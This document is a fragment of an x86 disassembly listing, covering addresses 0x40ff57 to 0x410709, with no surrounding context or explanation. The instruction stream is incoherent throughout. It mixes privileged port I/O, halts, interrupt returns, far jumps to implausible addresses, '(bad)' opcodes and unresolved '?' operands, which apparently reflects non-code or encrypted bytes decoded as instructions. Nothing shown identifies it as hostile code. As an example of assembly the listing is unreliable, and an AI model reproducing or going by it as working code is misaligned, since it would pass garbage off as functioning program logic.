  40ff57:	ret    0xed80
  40ff5a:	sbb    ah,BYTE PTR [edi]
  40ff5c:	inc    eax
  40ff5d:	and    DWORD PTR [esp+ebp*8],eax
  40ff60:	mov    esi,0x6fc928a9
  40ff65:	sub    eax,0x1645127
  40ff6a:	cdq    
  40ff6b:	mov    ebp,0x48d9fc5d
  40ff70:	mov    dl,0x5b
  40ff72:	out    0xb9,eax
  40ff74:	xchg   edi,eax
  40ff75:	imul   eax,DWORD PTR [ebx-0x1fb3c942],0x19
  40ff7c:	xor    eax,0x92b1b8c2
  40ff81:	add    ebx,DWORD PTR [ecx]
  40ff83:	in     al,dx
  40ff84:	in     al,dx
  40ff85:	outs   dx,DWORD PTR ds:[esi]
  40ff86:	fsub   QWORD PTR [edi+0x59]
  40ff89:	sub    eax,0x88aeaf33
  40ff8e:	test   DWORD PTR [ecx-0xd],esi
  40ff91:	mov    dh,0xd3
  40ff93:	dec    ebp
  40ff94:	aaa    
  40ff95:	jne    0x40ffe9
  40ff97:	mov    ah,0x8a
  40ff99:	iret   
  40ff9a:	test   BYTE PTR [ecx-0x46],bl
  40ff9d:	gs mov ebp,0x93b56ee7
  40ffa3:	push   ss
  40ffa4:	dec    edx
  40ffa5:	push   edi
  40ffa6:	mov    ds:0xdfd0e67f,eax
  40ffab:	clc    
  40ffac:	aam    0x50
  40ffae:	aaa    
  40ffaf:	sti    
  40ffb0:	mov    dl,bl
  40ffb2:	and    al,0xb4
  40ffb4:	inc    esi
  40ffb5:	cmp    eax,0x7c7e0369
  40ffba:	xchg   esi,eax
  40ffbb:	inc    esp
  40ffbc:	shl    BYTE PTR [esi],cl
  40ffbe:	jle    0x40ffd9
  40ffc0:	lods   al,BYTE PTR ds:[esi]
  40ffc1:	pop    es
  40ffc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffc3:	sbb    al,0xc5
  40ffc5:	sbb    ebp,edx
  40ffc7:	out    0x5c,al
  40ffc9:	hlt    
  40ffca:	xor    dl,BYTE PTR [eax+0x13ed5d85]
  40ffd0:	icebp  
  40ffd1:	jno    0x40ff92
  40ffd3:	sbb    DWORD PTR [esi-0x5f],edx
  40ffd6:	xchg   ebp,eax
  40ffd7:	mov    BYTE PTR [eax-0x64],al
  40ffda:	jmp    0x4fffc526
  40ffdf:	jl     0x40ffe1
  40ffe1:	adc    DWORD PTR [ecx],ebx
  40ffe3:	sbb    esp,DWORD PTR [ebx-0x5d]
  40ffe6:	jecxz  0x410015
  40ffe8:	pop    edi
  40ffe9:	lods   al,BYTE PTR ds:[esi]
  40ffea:	jmp    0x58d9f728
  40ffef:	and    ebp,DWORD PTR [ebp-0x31]
  40fff2:	int    0x10
  40fff4:	out    0xed,eax
  40fff6:	cmp    cl,ch
  40fff8:	outs   dx,BYTE PTR ds:[esi]
  40fff9:	pmullw mm6,QWORD PTR [ecx+0x40]
  40fffd:	ficom  WORD PTR [edx]
  40ffff:	pop    edi
  410000:	retf   
  410001:	mov    al,0xee
  410003:	in     al,dx
  410004:	bound  esi,QWORD PTR [edi-0x78a35407]
  41000a:	retf   0xe567
  41000d:	mov    ds:0xe7586eeb,eax
  410012:	out    0xf2,al
  410014:	dec    ebx
  410015:	mov    ecx,DWORD PTR [esi-0x5585bde7]
  41001b:	mov    bl,BYTE PTR [ecx+ebp*1+0x32]
  41001f:	retf   
  410020:	xor    DWORD PTR [ecx+0x4f],0x80ce663b
  410027:	(bad)  
  410028:	in     eax,dx
  410029:	in     eax,0xe7
  41002b:	shl    BYTE PTR [ecx-0x79],0xbe
  41002f:	repz push ebx
  410031:	dec    ebx
  410032:	mov    DWORD PTR gs:[ebp-0x79],ecx
  410036:	xor    eax,0x8465871f
  41003b:	call   DWORD PTR [ecx]
  41003d:	mov    esi,0xa80d0586
  410042:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  410044:	sbb    al,0x3f
  410046:	xchg   edi,eax
  410047:	cmp    BYTE PTR [edx-0x14],ah
  41004a:	pop    es
  41004b:	lods   eax,DWORD PTR ds:[esi]
  41004c:	repnz or al,0x11
  41004f:	mov    esp,0xec94b750
  410054:	inc    ebp
  410055:	inc    esp
  410056:	fldenv [eax-0x35]
  410059:	mov    bl,0x72
  41005b:	arpl   WORD PTR ds:[edi+0x1b7365cc],di
  410062:	mov    dh,0xf0
  410064:	xor    dl,BYTE PTR [edi+ebx*2]
  410067:	lock or edi,eax
  41006a:	scas   al,BYTE PTR es:[edi]
  41006b:	inc    esi
  41006c:	je     0x41005a
  41006e:	xchg   BYTE PTR [ecx],al
  410070:	dec    esi
  410071:	loopne 0x41003d
  410073:	in     eax,dx
  410074:	cwde   
  410075:	pop    ss
  410076:	(bad)  
  410077:	pop    ss
  410078:	pop    ss
  410079:	test   eax,esi
  41007b:	xchg   ecx,eax
  41007c:	lock or BYTE PTR [ebx+0x16058b21],bh
  410083:	sbb    BYTE PTR [edx+0x2ca4ab57],dl
  410089:	repz mov bl,0xa0
  41008c:	lods   al,BYTE PTR ds:[si]
  41008e:	repz call 0x8cb0:0x85e01d3
  410096:	dec    edi
  410097:	icebp  
  410098:	mov    eax,0xd4720b96
  41009d:	push   0x78081fb0
  4100a2:	pushf  
  4100a3:	add    BYTE PTR [esi+ebx*4+0x76],ch
  4100a7:	fsubr  QWORD PTR [edi-0x7]
  4100aa:	sub    cl,BYTE PTR gs:[eax]
  4100ad:	push   edx
  4100ae:	push   edi
  4100af:	lock ss ins DWORD PTR es:[edi],dx
  4100b2:	fmul   DWORD PTR [ebx-0x36cfc068]
  4100b8:	and    eax,0xd1390ede
  4100bd:	push   edi
  4100be:	inc    edx
  4100bf:	int    0x90
  4100c1:	add    BYTE PTR [ecx],ch
  4100c3:	adc    esp,DWORD PTR [ebx-0x18]
  4100c6:	jge    0x410072
  4100c8:	dec    esp
  4100c9:	outs   dx,DWORD PTR ds:[esi]
  4100ca:	inc    eax
  4100cb:	mov    al,0x85
  4100cd:	pop    edi
  4100ce:	jo     0x4100dd
  4100d0:	and    eax,0xd3584400
  4100d6:	adc    BYTE PTR [edx+0x6d],dh
  4100d9:	ret    0xe632
  4100dc:	jmp    0x26e6629
  4100e1:	int    0x7c
  4100e3:	clc    
  4100e4:	xor    ch,BYTE PTR [eax-0x74]
  4100e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100e8:	sub    eax,0x2b403760
  4100ed:	(bad)  [ebx+0x2eb13f25]
  4100f3:	xchg   edx,eax
  4100f4:	into   
  4100f5:	cmp    DWORD PTR [ebp+ebx*8-0x80],esi
  4100f9:	es dec ecx
  4100fb:	push   cs
  4100fc:	mov    ch,0xdb
  4100fe:	rcl    DWORD PTR [esi],1
  410100:	xchg   esp,eax
  410101:	jnp    0x410151
  410103:	adc    DWORD PTR [edx+0x7d],edi
  410106:	out    dx,eax
  410107:	cld    
  410108:	jno    0x410120
  41010a:	setno  BYTE PTR [esi+0x642c0d9f]
  410111:	jb     0x410138
  410113:	daa    
  410114:	cmp    eax,0x5a3359f4
  410119:	adc    eax,0x12f23cbd
  41011e:	popf   
  41011f:	push   edx
  410120:	aas    
  410121:	scas   al,BYTE PTR es:[edi]
  410122:	jnp    0x4100b4
  410124:	sahf   
  410125:	ins    DWORD PTR es:[edi],dx
  410126:	add    BYTE PTR [edi+ebp*8-0x5d5bceae],ah
  41012d:	imul   BYTE PTR [edi+0x57f74d17]
  410133:	cld    
  410134:	cmp    DWORD PTR [esi+0x3e],esi
  410137:	out    dx,eax
  410138:	mov    eax,ds:0xbc06594d
  41013d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013e:	dec    edi
  41013f:	lea    ecx,[ebp-0x67]
  410142:	adc    al,0x97
  410144:	(bad)  
  410145:	inc    DWORD PTR [edx+ebx*2]
  410148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410149:	sub    DWORD PTR [eax+0x428a728c],ebx
  41014f:	lods   eax,DWORD PTR ds:[esi]
  410150:	fiadd  WORD PTR es:[edx+0x3f96c1f1]
  410157:	sub    esp,DWORD PTR [esi]
  410159:	fs jae 0x4100fc
  41015c:	push   eax
  41015d:	sub    eax,0x3cd70060
  410162:	dec    BYTE PTR [edi-0x49e2e777]
  410168:	xor    al,0xc3
  41016a:	adc    esp,esp
  41016c:	clc    
  41016d:	xor    al,0x54
  41016f:	aaa    
  410170:	lds    esi,FWORD PTR [edi-0xa]
  410173:	jle    0x4101e1
  410175:	je     0x4101a7
  410177:	mov    ebp,0x87b00f28
  41017c:	int    0x9e
  41017e:	ficomp WORD PTR [ebp-0x50]
  410181:	jp     0x410195
  410183:	pop    es
  410184:	mov    BYTE PTR [ecx-0x4d6fb8d2],cl
  41018a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018b:	cwde   
  41018c:	jbe    0x41018f
  41018e:	popf   
  41018f:	test   DWORD PTR [eax-0x3552e553],ebx
  410195:	out    0x7,al
  410197:	jmp    0x410160
  410199:	mov    cl,0x55
  41019b:	adc    BYTE PTR [ecx],ah
  41019d:	cdq    
  41019e:	inc    eax
  41019f:	fneni(8087 only) 
  4101a1:	gs int 0xf4
  4101a4:	scas   al,BYTE PTR es:[edi]
  4101a5:	shl    al,cl
  4101a7:	inc    ebx
  4101a8:	lods   al,BYTE PTR ds:[esi]
  4101a9:	sub    ecx,DWORD PTR [edx-0x3a]
  4101ac:	test   al,0x79
  4101ae:	out    dx,eax
  4101af:	lahf   
  4101b0:	mov    ah,0xd4
  4101b2:	stos   BYTE PTR es:[edi],al
  4101b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101b4:	dec    esi
  4101b5:	out    0x9f,al
  4101b7:	stos   DWORD PTR es:[edi],eax
  4101b8:	jmp    0x9e11:0xf13f7919
  4101bf:	(bad)  
  4101c0:	jns    0x4101d8
  4101c2:	fst    DWORD PTR [ebp-0xb7408a9]
  4101c8:	lods   eax,DWORD PTR ds:[esi]
  4101c9:	cdq    
  4101ca:	mov    edi,0x32aa6cc3
  4101cf:	in     eax,0x1e
  4101d1:	(bad)  
  4101d2:	xchg   ecx,eax
  4101d3:	stos   BYTE PTR es:[edi],al
  4101d4:	mov    cl,0x33
  4101d6:	jp     0x410255
  4101d8:	(bad)  
  4101d9:	push   eax
  4101da:	sbb    al,0x76
  4101dc:	sti    
  4101dd:	lock mov edi,0x2659940
  4101e3:	ret    0xb2be
  4101e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e7:	bound  esp,QWORD PTR [edi+ebx*8-0x57]
  4101eb:	stc    
  4101ec:	or     BYTE PTR ds:0xe7e33938,bl
  4101f2:	mov    edx,0x3798a0ea
  4101f7:	xchg   edi,eax
  4101f8:	ds in  al,0x6b
  4101fb:	sub    DWORD PTR [ecx+0x68],0x65b6ac18
  410202:	bound  esi,QWORD PTR [ebx+0xc4f019c]
  410208:	push   edi
  410209:	jmp    0xc338fe9
  41020e:	sub    DWORD PTR [ebx+0x2d],eax
  410211:	ret    
  410212:	pop    es
  410213:	pop    ds
  410214:	pusha  
  410215:	jge    0x410222
  410217:	and    BYTE PTR [ebx-0x124965fc],dl
  41021d:	cmp    edx,DWORD PTR [eax]
  41021f:	lea    ecx,[ebp+edi*1-0x50c7b48f]
  410226:	mov    cl,BYTE PTR ds:0x81ad79e9
  41022c:	jecxz  0x41025f
  41022e:	imul   ecx,DWORD PTR [ebp-0x9],0x36
  410232:	xchg   esp,eax
  410233:	lea    ebp,[ecx+0xae366dc]
  410239:	dec    ebx
  41023a:	pop    edi
  41023b:	add    ecx,DWORD PTR ds:0x9cb6aa18
  410241:	sahf   
  410242:	add    DWORD PTR [edx-0x5db51c96],0x27
  410249:	sbb    ecx,esp
  41024b:	sub    BYTE PTR [ebp+0x6b],dl
  41024e:	mov    ch,0xb6
  410250:	pop    edi
  410251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410252:	(bad)  
  410253:	or     DWORD PTR [edi+0x267772f6],eax
  410259:	cmp    ebp,DWORD PTR [ebx+0x1065bbc7]
  41025f:	cmp    dl,BYTE PTR [esi-0x3cef0f85]
  410265:	sub    bl,ch
  410267:	frstor [ebx-0x2b]
  41026a:	push   ebp
  41026b:	cli    
  41026c:	shl    bh,cl
  41026e:	add    BYTE PTR [ecx-0x21],dh
  410271:	shl    DWORD PTR [edx+0x4],0x90
  410275:	out    dx,eax
  410276:	in     al,0x13
  410278:	inc    esi
  410279:	and    esi,DWORD PTR [edx]
  41027b:	mov    WORD PTR [ebp+0x51],es
  41027e:	pushf  
  41027f:	in     eax,0x47
  410281:	mov    edi,0x9a554e4e
  410286:	and    eax,0x46cbc36e
  41028b:	les    eax,FWORD PTR [edi+0x4bcaeaa7]
  410291:	mov    ?,ecx
  410293:	add    eax,0x2ea31aca
  410298:	out    0x9d,al
  41029a:	push   eax
  41029b:	imul   ebp,DWORD PTR [edx],0xffffffc4
  41029e:	call   0x5fd791c1
  4102a3:	xchg   ecx,eax
  4102a4:	jmp    0x4102bd
  4102a6:	inc    ebx
  4102a7:	stos   BYTE PTR es:[edi],al
  4102a8:	ja     0x4102b6
  4102aa:	and    bl,BYTE PTR [esi+0x34]
  4102ad:	aaa    
  4102ae:	add    esp,DWORD PTR [ebp-0x54d59eb7]
  4102b4:	pop    ds
  4102b5:	jbe    0x410282
  4102b7:	retf   0x1c20
  4102ba:	test   al,0x60
  4102bc:	add    al,0xba
  4102be:	jns    0x4102a2
  4102c0:	push   0xea15976
  4102c5:	call   0x447c:0xadab4d39
  4102cc:	jo     0x41028d
  4102ce:	loopne 0x410328
  4102d0:	rcl    BYTE PTR [ebp+0x41],1
  4102d3:	add    dh,BYTE PTR [edx]
  4102d5:	mov    eax,0xbab10d79
  4102da:	ret    0xfe89
  4102dd:	push   0x48
  4102df:	and    eax,0xfe4eec85
  4102e4:	xor    eax,0x626574ff
  4102e9:	mov    edx,0xaf26a36c
  4102ee:	cmp    esp,edi
  4102f0:	push   eax
  4102f1:	sbb    ecx,DWORD PTR [ebp-0x57378d8d]
  4102f7:	or     dh,BYTE PTR [ecx]
  4102f9:	aad    0xe7
  4102fb:	xchg   edi,eax
  4102fc:	dec    edi
  4102fd:	ret    
  4102fe:	mov    al,ds:0x25152814
  410303:	xchg   DWORD PTR [esi+0x64c7ce75],ecx
  410309:	jb     0x410297
  41030b:	fs repnz ins BYTE PTR es:[edi],dx
  41030e:	mov    gs,edx
  410310:	mov    eax,ds:0x1f674224
  410315:	and    BYTE PTR [edx],0xa7
  410318:	inc    edi
  410319:	stos   BYTE PTR es:[edi],al
  41031a:	xchg   ebx,eax
  41031b:	lods   al,BYTE PTR ds:[esi]
  41031c:	mov    esp,DWORD PTR ds:0xb33f3b40
  410322:	mov    esi,0x4d6d8b20
  410327:	push   es
  410328:	xchg   esp,eax
  410329:	frstor [ebx+0x777b2a67]
  41032f:	mov    bh,0x3b
  410331:	xlat   BYTE PTR ds:[ebx]
  410332:	std    
  410333:	sub    ebx,ebx
  410335:	mov    ch,0xf9
  410337:	cld    
  410338:	les    edi,FWORD PTR es:[edx]
  41033b:	mov    bh,0x35
  41033d:	dec    ebp
  41033e:	stc    
  41033f:	imul   esp,DWORD PTR [edx+0xe],0xffffff88
  410343:	lods   al,BYTE PTR ds:[esi]
  410344:	jmp    FWORD PTR [edx+0x68]
  410347:	and    esp,DWORD PTR [eax]
  410349:	xor    eax,0x94fdfb09
  41034e:	add    eax,0x70770e45
  410353:	ins    BYTE PTR es:[edi],dx
  410354:	lahf   
  410355:	push   edx
  410356:	adc    ebx,DWORD PTR [ecx-0x67]
  410359:	inc    edi
  41035a:	into   
  41035b:	push   eax
  41035c:	add    eax,0x4ecfd6ee
  410361:	les    edi,FWORD PTR ds:0x9759e8fe
  410367:	mov    al,0x2f
  410369:	pop    ss
  41036a:	pop    edx
  41036b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41036c:	ds scas eax,DWORD PTR es:[edi]
  41036e:	popa   
  41036f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410370:	dec    edx
  410371:	repz push 0x14abac67
  410377:	jmp    0xb3a5:0x3b1627f4
  41037e:	test   eax,0xda899e21
  410383:	xchg   ebp,eax
  410384:	cmp    edi,DWORD PTR [eax]
  410386:	loop   0x4103a1
  410388:	imul   DWORD PTR [eax+0x6e]
  41038b:	xchg   ecx,eax
  41038c:	xlat   BYTE PTR ds:[ebx]
  41038d:	sti    
  41038e:	addr16 xchg dh,dh
  410391:	cmc    
  410392:	leave  
  410393:	mov    esp,0x551cfade
  410398:	jnp    0x41039a
  41039a:	xor    DWORD PTR [eax+eax*4-0x74b69b16],0xd472526c
  4103a5:	lahf   
  4103a6:	inc    ebp
  4103a7:	cmp    al,0xba
  4103a9:	loop   0x410404
  4103ab:	push   ecx
  4103ac:	(bad)  
  4103ae:	fstp   TBYTE PTR [edi]
  4103b0:	sbb    esi,DWORD PTR [eax+0x503cd9b7]
  4103b6:	sti    
  4103b7:	fbld   TBYTE PTR [ebx+0x45ec2183]
  4103bd:	mov    al,ds:0xc4926785
  4103c2:	mov    ebp,0xf870ba17
  4103c7:	xlat   BYTE PTR ds:[ebx]
  4103c8:	jp     0x410426
  4103ca:	lods   al,BYTE PTR ds:[esi]
  4103cb:	ds cmp esi,edi
  4103ce:	xchg   edx,eax
  4103cf:	bound  ebp,QWORD PTR [edi]
  4103d1:	adc    ah,BYTE PTR [edi+0x19]
  4103d4:	cmc    
  4103d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103d6:	push   0xffffff91
  4103d8:	imul   edi,DWORD PTR [edi+0x56bb1715],0x8e523787
  4103e2:	pop    edx
  4103e3:	push   ebx
  4103e4:	dec    edx
  4103e5:	mul    DWORD PTR [eax+0x5d8f39c]
  4103eb:	call   0x590c48a1
  4103f0:	inc    edi
  4103f1:	sub    bl,BYTE PTR [esi+0xf12ba8b]
  4103f7:	test   eax,0x1227151d
  4103fc:	mov    al,0xe6
  4103fe:	jb     0x4103cd
  410400:	arpl   WORD PTR ds:0x35ba40d3,bx
  410406:	sub    al,0x46
  410408:	inc    ecx
  410409:	aad    0x80
  41040b:	pop    ebx
  41040c:	push   esp
  41040d:	test   eax,0xbc7a0c6a
  410412:	add    eax,edx
  410414:	fnsave [eax-0x8b8ed4e]
  41041a:	lea    ebp,[esi+0x21d0773c]
  410420:	jg     0x410495
  410422:	inc    edi
  410423:	cmc    
  410424:	cmp    eax,0xeb4f14b2
  410429:	fwait
  41042a:	adc    ebx,DWORD PTR [ebp+edx*4+0x29]
  41042e:	lock pop esi
  410430:	outs   dx,DWORD PTR ds:[esi]
  410431:	or     DWORD PTR [edx],edx
  410433:	xchg   dl,bl
  410435:	jne    0x4104af
  410437:	lea    ebx,[ecx+0x23dd3924]
  41043d:	sbb    edi,DWORD PTR [esi+0x1f9f5d4b]
  410443:	mov    dl,BYTE PTR ds:0x7ce651dd
  410449:	mov    dl,0xfd
  41044b:	pop    esi
  41044c:	xchg   ebx,eax
  41044d:	imul   ebx,DWORD PTR [ecx-0x64],0xf35a26db
  410454:	shl    BYTE PTR [ecx+0x36],cl
  410457:	adc    edi,DWORD PTR [edi-0x55fce811]
  41045d:	add    ebx,DWORD PTR [eax+0x6500f6b0]
  410463:	push   esp
  410464:	adc    al,0xb9
  410466:	loope  0x41048d
  410468:	inc    esp
  410469:	mov    dh,0x2
  41046b:	mov    ds:0xe81ab894,al
  410470:	mov    ds:0x34037e4b,al
  410475:	ret    
  410476:	stos   DWORD PTR es:[edi],eax
  410477:	xor    ecx,esp
  410479:	jns    0x4104a8
  41047b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41047c:	push   ss
  41047d:	test   al,0x3a
  41047f:	aaa    
  410480:	jmp    0x3daf38d5
  410485:	fsub   st(7),st
  410487:	cli    
  410488:	adc    al,0x9f
  41048a:	mov    WORD PTR [edi+0x72],cs
  41048d:	int3   
  41048e:	repz jo 0x4104af
  410491:	lahf   
  410492:	pusha  
  410493:	imul   eax,ebp,0x67545573
  410499:	push   ss
  41049a:	mov    bl,0xe8
  41049c:	xor    esi,eax
  41049e:	cmp    DWORD PTR [edx],esp
  4104a0:	inc    ebx
  4104a1:	mov    bl,bh
  4104a3:	ss popa 
  4104a5:	sbb    edx,DWORD PTR [ebx+0x7e]
  4104a8:	mov    WORD PTR [edi+0x6e67382c],ds
  4104ae:	mov    WORD PTR [edi+0x15],?
  4104b1:	pushf  
  4104b2:	add    edx,DWORD PTR [edi+0x5dfae026]
  4104b8:	sbb    ebp,edx
  4104ba:	std    
  4104bb:	sub    ebp,DWORD PTR [ecx]
  4104bd:	push   esi
  4104be:	retf   
  4104bf:	call   0xb08bfa5d
  4104c4:	cmp    BYTE PTR [eax+0x4c],0x12
  4104c8:	cmp    dh,bl
  4104ca:	retf   0x9ef1
  4104cd:	out    dx,al
  4104ce:	xor    BYTE PTR [esi],bl
  4104d0:	repnz neg cl
  4104d3:	push   ebx
  4104d4:	ss dec eax
  4104d6:	ins    BYTE PTR es:[edi],dx
  4104d7:	xor    dl,BYTE PTR [eax-0x6f]
  4104da:	push   ebp
  4104db:	jg     0x41053e
  4104dd:	xchg   DWORD PTR [edx+0x40f833d3],edx
  4104e3:	cmp    eax,0x67b6506f
  4104e8:	push   ds
  4104e9:	fsub   st,st(2)
  4104eb:	sbb    al,0xee
  4104ed:	mov    eax,ds:0x48fbaa86
  4104f2:	push   ebx
  4104f3:	fisub  WORD PTR [ecx+esi*8]
  4104f6:	mov    eax,0x58fbd60e
  4104fb:	add    dh,BYTE PTR [eax-0x425559a1]
  410501:	jo     0x410563
  410503:	dec    ebx
  410504:	or     ecx,ebp
  410506:	xlat   BYTE PTR ds:[ebx]
  410507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410508:	sub    BYTE PTR [ecx+edi*4-0x37],dh
  41050c:	dec    ecx
  41050d:	adc    edi,esi
  41050f:	ret    0x62a6
  410512:	sub    dl,ch
  410514:	xor    edx,DWORD PTR [ecx+0x44c912ba]
  41051a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41051b:	pextrw eax,(bad),0xc5
  41051d:	inc    eax
  41051e:	sbb    ecx,DWORD PTR [edx+0x15]
  410521:	sub    BYTE PTR [ecx+0x639e100f],bl
  410527:	xlat   BYTE PTR ds:[ebx]
  410528:	loopne 0x410582
  41052a:	jmp    0x4105a8
  41052c:	mov    esi,0x6528842d
  410531:	das    
  410532:	dec    eax
  410533:	push   0x6f4e052a
  410538:	aam    0xc4
  41053a:	pop    esp
  41053b:	jmp    FWORD PTR [esi]
  41053d:	adc    BYTE PTR [ebx+0x2f],0x62
  410541:	lahf   
  410542:	ss mov ch,0x41
  410545:	es sub bl,ah
  410548:	mov    ah,0x9a
  41054a:	pop    esp
  41054b:	sti    
  41054c:	and    BYTE PTR [eax],dl
  41054e:	rcr    BYTE PTR [ebp-0x438b2165],cl
  410554:	jb     0x4105d3
  410556:	mov    esp,0xe7a2fd65
  41055b:	aam    0x54
  41055d:	lods   al,BYTE PTR ds:[esi]
  41055e:	cmc    
  41055f:	sub    esi,edx
  410561:	adc    dh,BYTE PTR [ebx-0x14]
  410564:	or     al,0x2a
  410566:	iret   
  410567:	sbb    DWORD PTR [ebp-0xf679b6],ebp
  41056d:	pusha  
  41056e:	adc    BYTE PTR [ebx+0xa],dh
  410571:	loope  0x4105db
  410573:	js     0x410592
  410575:	jge    0x410519
  410577:	and    ecx,DWORD PTR [esi+ebp*2+0x68]
  41057b:	inc    ecx
  41057c:	inc    edx
  41057d:	xor    BYTE PTR [edx],0xff
  410580:	add    eax,0x86ec4922
  410585:	sahf   
  410586:	mov    ch,0x83
  410588:	mov    ds:0x888751dd,eax
  41058d:	test   BYTE PTR [bp+0x12f9],dh
  410592:	push   ss
  410593:	dec    esi
  410594:	push   0xffffffc4
  410596:	jo     0x41057b
  410598:	outs   dx,DWORD PTR ds:[esi]
  410599:	fwait
  41059a:	mov    esi,DWORD PTR ds:0x191daeb
  4105a0:	test   BYTE PTR [ebx],ah
  4105a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105a3:	mov    ds:0x9bf4df66,eax
  4105a8:	dec    ebx
  4105a9:	and    eax,0x94189eca
  4105ae:	or     eax,0x1320a77c
  4105b3:	xor    cl,BYTE PTR [ebx+0x74]
  4105b6:	pushf  
  4105b7:	dec    ebx
  4105b8:	loop   0x4105a8
  4105ba:	and    ah,BYTE PTR [edi]
  4105bc:	sbb    bl,ah
  4105be:	push   esi
  4105bf:	push   ebx
  4105c0:	pop    edi
  4105c1:	popf   
  4105c2:	mov    eax,0xa628a8bc
  4105c7:	sub    ah,BYTE PTR [ebp-0x7c85f399]
  4105cd:	pop    ss
  4105ce:	hlt    
  4105cf:	mov    ah,0xcc
  4105d1:	mov    BYTE PTR [esi+0x71],dh
  4105d4:	in     eax,0x34
  4105d6:	or     eax,0x59cc0ac7
  4105db:	dec    ebx
  4105dc:	or     eax,DWORD PTR [edx-0x4d]
  4105df:	leave  
  4105e0:	or     DWORD PTR [ecx],0x31
  4105e3:	mov    al,ds:0xb5ec3f7b
  4105e8:	add    edx,DWORD PTR [bx+di+0x77]
  4105ec:	inc    edx
  4105ed:	add    esp,ebp
  4105ef:	scas   al,BYTE PTR es:[edi]
  4105f0:	(bad)  
  4105f1:	imul   esp,esp,0xffffff85
  4105f4:	or     eax,0xce85e411
  4105f9:	xchg   esp,eax
  4105fa:	dec    edx
  4105fb:	dec    esp
  4105fc:	jns    0x41060a
  4105fe:	outs   dx,DWORD PTR ds:[esi]
  4105ff:	bound  esp,QWORD PTR cs:[ebx]
  410602:	dec    ecx
  410603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410604:	mov    dl,0x6a
  410606:	pop    edx
  410607:	fcomip st,st(5)
  410609:	xor    DWORD PTR [edi],edx
  41060b:	cld    
  41060c:	and    BYTE PTR [ebp+0x3b981de6],0x20
  410613:	call   0xae2c39a1
  410618:	dec    edx
  410619:	dec    edx
  41061a:	(bad)  
  41061b:	(bad)  [esi+0x1baeea35]
  410621:	xchg   ch,bh
  410623:	or     BYTE PTR [esi],dh
  410625:	jmp    0xfe7e9b3a
  41062a:	rcr    DWORD PTR [esp+ecx*8-0x5b62a1e3],0xb
  410632:	sbb    al,0xd7
  410634:	iret   
  410635:	and    DWORD PTR [esi-0x41fd84b5],ebx
  41063b:	(bad)  
  41063c:	mov    WORD PTR [esi],ds
  41063e:	push   ss
  41063f:	loop   0x410648
  410641:	call   0xd0cead5f
  410646:	out    0x72,eax
  410648:	test   DWORD PTR [ecx],ecx
  41064a:	aam    0x68
  41064c:	pop    ebp
  41064d:	xchg   edx,eax
  41064e:	or     BYTE PTR [esi+0xd268dcf],al
  410654:	mov    esp,0xbd3a1fd3
  410659:	mov    bh,0x73
  41065b:	jns    0x410644
  41065d:	lds    ebx,FWORD PTR [esi+0x10]
  410660:	hlt    
  410661:	xlat   BYTE PTR ds:[ebx]
  410662:	mov    eax,0x95de5583
  410667:	pop    es
  410668:	xor    al,0x72
  41066a:	inc    ebp
  41066b:	dec    esp
  41066c:	(bad)  
  41066e:	pusha  
  41066f:	fstp   st(4)
  410671:	aas    
  410672:	lods   eax,DWORD PTR ds:[esi]
  410674:	sub    bh,al
  410676:	test   BYTE PTR [edx],dh
  410678:	mov    eax,ds:0x527b428
  41067d:	sbb    al,0xcd
  41067f:	fs popf 
  410681:	or     esi,DWORD PTR [eax+0x4dbdbd1f]
  410687:	xchg   edx,eax
  410688:	bound  ebx,QWORD PTR [ecx]
  41068a:	outs   dx,BYTE PTR ds:[esi]
  41068b:	sub    eax,0x529e953b
  410690:	push   eax
  410691:	test   BYTE PTR [eax],dh
  410693:	mov    dh,0xd9
  410695:	iret   
  410696:	loope  0x41065a
  410698:	ins    DWORD PTR es:[edi],dx
  410699:	(bad)  
  41069a:	dec    eax
  41069b:	(bad)  
  41069c:	mov    ebp,0x6445efd9
  4106a1:	lds    ebx,FWORD PTR [ecx]
  4106a3:	xor    BYTE PTR [esi+ebx*1-0x7c],al
  4106a7:	ss cmp eax,0x25f5e2d9
  4106ad:	cwde   
  4106ae:	inc    esi
  4106af:	ret    
  4106b0:	outs   dx,BYTE PTR ds:[esi]
  4106b1:	dec    esp
  4106b2:	bound  eax,QWORD PTR [eax+0x61]
  4106b5:	out    0xf5,eax
  4106b7:	daa    
  4106b8:	and    BYTE PTR [eax],al
  4106ba:	pop    esp
  4106bb:	xchg   ecx,eax
  4106bc:	or     edx,esp
  4106be:	in     al,0xdd
  4106c0:	jae    0x4106f3
  4106c2:	sub    al,0x55
  4106c4:	dec    ebx
  4106c5:	sub    al,0x51
  4106c7:	repnz inc eax
  4106c9:	pop    ebp
  4106ca:	adc    al,0xee
  4106cc:	lahf   
  4106cd:	jbe    0x4106fe
  4106cf:	arpl   WORD PTR [esi],bp
  4106d1:	shl    dh,1
  4106d3:	sub    BYTE PTR [ecx+edi*8+0x557b4731],bh
  4106da:	jmp    0x21504631
  4106df:	test   BYTE PTR [ebp+ebx*8-0x60c01919],dl
  4106e6:	push   es
  4106e7:	or     eax,DWORD PTR [esi+ebp*8]
  4106ea:	jne    0x41066d
  4106ec:	sub    DWORD PTR [edx-0x17],ebx
  4106ef:	mov    BYTE PTR [edx-0x54],ch
  4106f2:	rcl    DWORD PTR [edx],0x30
  4106f5:	loope  0x410681
  4106f7:	push   ds
  4106f8:	mov    eax,ds:0x215dc203
  4106fd:	sub    ch,BYTE PTR [esi+edi*1+0x9debeb]
  410704:	aaa    
  410705:	add    ch,BYTE PTR [eax+0x68]
  410708:	in     eax,dx
  410709:	and    BYTE PTR [ecx],dl
